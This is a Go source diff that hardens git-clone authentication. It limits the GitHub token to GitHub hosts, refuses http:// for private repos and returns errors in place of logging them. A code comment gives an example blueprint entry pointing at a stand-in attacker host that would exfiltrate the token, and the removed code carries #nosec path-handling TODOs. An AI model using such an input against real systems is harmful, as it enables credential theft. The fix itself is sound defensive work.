@@ -3,6 +3,7 @@ package helpers
 import (
 	"errors"
 	"fmt"
+	neturl "net/url"
 	"os"
 	"path/filepath"
 	"strings"
@@ -16,16 +17,6 @@ import (
 	"github.com/go-git/go-git/v5/plumbing/transport/ssh"
 )
 
-// HandleGitOperation routes a Git operation to either clone or file download
-// based on whether the URL has a file extension.
-func HandleGitOperation(opts types.GitOptions, initConfig *types.InitConfig) error {
-	if filepath.Ext(opts.URL) != "" {
-		return HandleGitFileDownload(opts, initConfig)
-	} else {
-		return HandleGitClone(opts, initConfig)
-	}
-}
-
 // HandleGitClone clones a Git repository to the specified path with optional
 // authentication via SSH key, GitHub API token, or OAuth.
 func HandleGitClone(opts types.GitOptions, initConfig *types.InitConfig) error {
@@ -35,7 +26,11 @@ func HandleGitClone(opts types.GitOptions, initConfig *types.InitConfig) error {
 
 	// Use authentication for private repos or SSH URLs
 	if opts.Private || strings.HasPrefix(opts.URL, "git@") {
-		auth = getAuthMethod(opts.URL, initConfig)
+		var err error
+		auth, err = getAuthMethod(opts.URL, initConfig)
+		if err != nil {
+			return fmt.Errorf("error authenticating Git clone: %w", err)
+		}
 		log.Debugf("Using authentication for Git clone: %s", opts.URL)
 	} else {
 		log.Debugf("No authentication needed for Git clone: %s", opts.URL)
@@ -103,83 +98,125 @@ func CheckAndUpdateRemoteURL(repoPath, desiredURL string) error {
 	return nil
 }
 
-func getAuthMethod(url string, initConfig *types.InitConfig) transport.AuthMethod {
-	if strings.HasPrefix(url, "git@") {
-		// Use the specified SSH key or try to find a suitable key
-		sshKeyValue := initConfig.Variables.Flags.SSHKey
+// githubHosts are the hosts the configured GitHub token may be sent to.
+var githubHosts = map[string]bool{
+	"github.com":     true,
+	"www.github.com": true,
+	// Cloning a file from a repository goes through the raw content host.
+	"raw.githubusercontent.com": true,
+}
 
-		// Check if the value is a Base64-encoded key or a file path
-		if sshKeyValue != "" {
-			// If the value contains newlines or begins with "ssh-", it's likely a Base64-encoded key
-			if strings.Contains(sshKeyValue, "\n") || strings.HasPrefix(sshKeyValue, "ssh-") {
-				log.Debugf("Using Base64-encoded SSH key")
-				auth, err := ssh.NewPublicKeys("git", []byte(sshKeyValue), "")
-				if err != nil {
-					log.Errorf("Error creating SSH authentication from Base64 key: %v", err)
-					return nil
-				}
-				return auth
-			} else {
-				// Treat as a file path
-				if _, err := os.Stat(sshKeyValue); os.IsNotExist(err) {
-					log.Errorf("Specified SSH key file does not exist: %s", sshKeyValue)
-					return nil
-				}
+// getAuthMethod picks the credential for a remote, and returns an error rather
+// than a credential when honouring the request would leak one.
+//
+// The URL comes from a blueprint, so it is attacker-controlled input whenever a
+// blueprint is: this used to attach the user's GitHub token to every non-SSH
+// remote, which meant `{url: "http://attacker.tld/r.git", private: true}` mailed
+// the PAT to the attacker in cleartext. The token now goes to GitHub's hosts and
+// nowhere else, and http:// is refused for private repos outright — there is no
+// safe way to send a credential over it.
+func getAuthMethod(rawURL string, initConfig *types.InitConfig) (transport.AuthMethod, error) {
+	if !strings.HasPrefix(rawURL, "git@") {
+		return getHTTPAuthMethod(rawURL, initConfig)
+	}
+	return getSSHAuthMethod(initConfig)
+}
 
-				auth, err := ssh.NewPublicKeysFromFile("git", sshKeyValue, "")
-				if err != nil {
-					log.Errorf("Error creating SSH authentication from file: %v", err)
-					return nil
-				}
-				return auth
-			}
-		} else {
-			// No SSH key specified, try to find a suitable key file
-			homeDir, err := os.UserHomeDir()
+// getHTTPAuthMethod returns the token for GitHub remotes and no credential for
+// every other host, so a non-GitHub remote is cloned anonymously rather than
+// handed a secret it has no claim to.
+func getHTTPAuthMethod(rawURL string, initConfig *types.InitConfig) (transport.AuthMethod, error) {
+	parsed, err := neturl.Parse(rawURL)
+	if err != nil {
+		return nil, fmt.Errorf("invalid repository URL %q: %w", rawURL, err)
+	}
+
+	if parsed.Scheme == "http" {
+		return nil, fmt.Errorf("refusing to use %q: http:// sends the repository credential in cleartext, use https:// instead", rawURL)
+	}
+	if parsed.Scheme != "https" {
+		return nil, fmt.Errorf("refusing to use %q: only https:// and git@ remotes support authentication", rawURL)
+	}
+
+	if !githubHosts[strings.ToLower(parsed.Hostname())] {
+		log.Warnf("Not sending the GitHub token to %s: it is not a GitHub host; cloning without authentication", parsed.Hostname())
+		return nil, nil
+	}
+
+	token := initConfig.Variables.Flags.GHAPIToken
+	if token == "" {
+		log.Debugf("No GitHub token configured; cloning %s without authentication", rawURL)
+		return nil, nil
+	}
+
+	return &http.BasicAuth{
+		Username: "git",
+		Password: token,
+	}, nil
+}
+
+func getSSHAuthMethod(initConfig *types.InitConfig) (transport.AuthMethod, error) {
+	// Use the specified SSH key or try to find a suitable key
+	sshKeyValue := initConfig.Variables.Flags.SSHKey
+
+	// Check if the value is a Base64-encoded key or a file path
+	if sshKeyValue != "" {
+		// If the value contains newlines or begins with "ssh-", it's likely a Base64-encoded key
+		if strings.Contains(sshKeyValue, "\n") || strings.HasPrefix(sshKeyValue, "ssh-") {
+			log.Debugf("Using Base64-encoded SSH key")
+			auth, err := ssh.NewPublicKeys("git", []byte(sshKeyValue), "")
 			if err != nil {
-				log.Errorf("Error getting user home directory: %v", err)
-				return nil
+				return nil, fmt.Errorf("error creating SSH authentication from Base64 key: %w", err)
 			}
-
-			// List of common SSH key locations to try
-			possibleKeys := []string{
-				filepath.Join(homeDir, ".ssh", "id_rsa"),
-				filepath.Join(homeDir, ".ssh", "git"),
-				filepath.Join(homeDir, ".ssh", "id_ed25519"),
-				filepath.Join(homeDir, ".ssh", "github_rsa"),
-				filepath.Join(homeDir, ".ssh", "id_ecdsa"),
-			}
-
-			// Try each possible key location
-			keyFound := false
-			sshKeyPath := ""
-			for _, keyPath := range possibleKeys {
-				if _, err := os.Stat(keyPath); err == nil {
-					sshKeyPath = keyPath
-					keyFound = true
-					log.Debugf("Found SSH key at: %s", sshKeyPath)
-					break
-				}
-			}
-
-			if !keyFound {
-				log.Errorf("No SSH key found in common locations. Please specify an SSH key path or Base64-encoded key.")
-				return nil
-			}
-
-			auth, err := ssh.NewPublicKeysFromFile("git", sshKeyPath, "")
-			if err != nil {
-				log.Errorf("Error creating SSH authentication: %v", err)
-				return nil
-			}
-			return auth
+			return auth, nil
 		}
-	} else {
-		return &http.BasicAuth{
-			Username: "git",
-			Password: initConfig.Variables.Flags.GHAPIToken,
+
+		// Treat as a file path
+		if _, err := os.Stat(sshKeyValue); os.IsNotExist(err) {
+			return nil, fmt.Errorf("specified SSH key file does not exist: %s", sshKeyValue)
+		}
+
+		auth, err := ssh.NewPublicKeysFromFile("git", sshKeyValue, "")
+		if err != nil {
+			return nil, fmt.Errorf("error creating SSH authentication from file: %w", err)
+		}
+		return auth, nil
+	}
+
+	// No SSH key specified, try to find a suitable key file
+	homeDir, err := os.UserHomeDir()
+	if err != nil {
+		return nil, fmt.Errorf("error getting user home directory: %w", err)
+	}
+
+	// List of common SSH key locations to try
+	possibleKeys := []string{
+		filepath.Join(homeDir, ".ssh", "id_rsa"),
+		filepath.Join(homeDir, ".ssh", "git"),
+		filepath.Join(homeDir, ".ssh", "id_ed25519"),
+		filepath.Join(homeDir, ".ssh", "github_rsa"),
+		filepath.Join(homeDir, ".ssh", "id_ecdsa"),
+	}
+
+	// Try each possible key location
+	sshKeyPath := ""
+	for _, keyPath := range possibleKeys {
+		if _, err := os.Stat(keyPath); err == nil {
+			sshKeyPath = keyPath
+			log.Debugf("Found SSH key at: %s", sshKeyPath)
+			break
 		}
 	}
+
+	if sshKeyPath == "" {
+		return nil, fmt.Errorf("no SSH key found in common locations: specify an SSH key path or Base64-encoded key")
+	}
+
+	auth, err := ssh.NewPublicKeysFromFile("git", sshKeyPath, "")
+	if err != nil {
+		return nil, fmt.Errorf("error creating SSH authentication: %w", err)
+	}
+	return auth, nil
 }
 
 // HandleGitPull pulls the latest changes from a remote Git repository,
@@ -210,7 +247,10 @@ func HandleGitPull(opts types.GitOptions, initConfig *types.InitConfig) error {
 		remoteURL := remote.Config().URLs[0]
 		// For SSH URLs (git@...) or if the repo is marked as private, use authentication
 		if strings.HasPrefix(remoteURL, "git@") || opts.Private {
-			auth = getAuthMethod(remoteURL, initConfig)
+			auth, err = getAuthMethod(remoteURL, initConfig)
+			if err != nil {
+				return fmt.Errorf("error authenticating Git pull: %w", err)
+			}
 			log.Debugf("Using authentication for Git pull: %s", opts.Target)
 		} else {
 			log.Debugf("No authentication needed for Git pull: %s", opts.Target)
@@ -226,63 +266,5 @@ func HandleGitPull(opts types.GitOptions, initConfig *types.InitConfig) error {
 	}
 
 	log.Infof("Git repository updated: %s", opts.Target)
-	return nil
-}
-
-// HandleGitFileDownload downloads a single file from a GitHub repository
-// by converting the blob URL to a raw content URL.
-func HandleGitFileDownload(opts types.GitOptions, initConfig *types.InitConfig) error {
-	log.Debugf("Downloading file from Git repository: %s", opts.URL)
-	// Extract the repository URL and file path from the opts.URL
-	parts := strings.Split(opts.URL, "/blob/")
-	if len(parts) != 2 {
-		return fmt.Errorf("invalid URL format for file download")
-	}
-	repoURL := parts[0]
-	filePath := parts[1]
-
-	// Create a temporary directory for cloning the repository
-	tempDir, err := os.MkdirTemp("", "git-clone-")
-	if err != nil {
-		return fmt.Errorf("error creating temporary directory: %v", err)
-	}
-	defer func(path string) {
-		err := os.RemoveAll(path)
-		if err != nil {
-			log.Errorf("error removing temporary directory: %v", err)
-		}
-	}(tempDir)
-
-	// Clone the repository into the temporary directory
-	cloneOpts := types.GitOptions{
-		URL:     repoURL,
-		Private: opts.Private,
-		Target:  tempDir,
-	}
-	err = HandleGitClone(cloneOpts, initConfig)
-	if err != nil {
-		return fmt.Errorf("error cloning Git repository: %v", err)
-	}
-
-	// Read the contents of the specified file
-	fileContent, err := os.ReadFile(filepath.Join(tempDir, filePath)) // #nosec G304 -- path is operator-supplied blueprint/config input; containment added in PR8
-	if err != nil {
-		return fmt.Errorf("error reading file from Git repository: %v", err)
-	}
-
-	// Create the target directory if it doesn't exist
-	targetDir := filepath.Dir(opts.Target)
-	err = os.MkdirAll(targetDir, os.ModePerm) // #nosec G301 -- TODO(PR8): blueprint-target directory; create with the requested mode
-	if err != nil {
-		return fmt.Errorf("error creating target directory: %v", err)
-	}
-
-	// Write the file contents to the target file
-	err = os.WriteFile(opts.Target, fileContent, 0644) // #nosec G306 G703 -- TODO(PR8): create with target mode instead of chmod-after; TODO(PR8): path derived from operator blueprint input; containment added in PR8
-	if err != nil {
-		return fmt.Errorf("error writing file: %v", err)
-	}
-
-	log.Infof("File downloaded from Git repository: %s", opts.Target)
 	return nil
 }
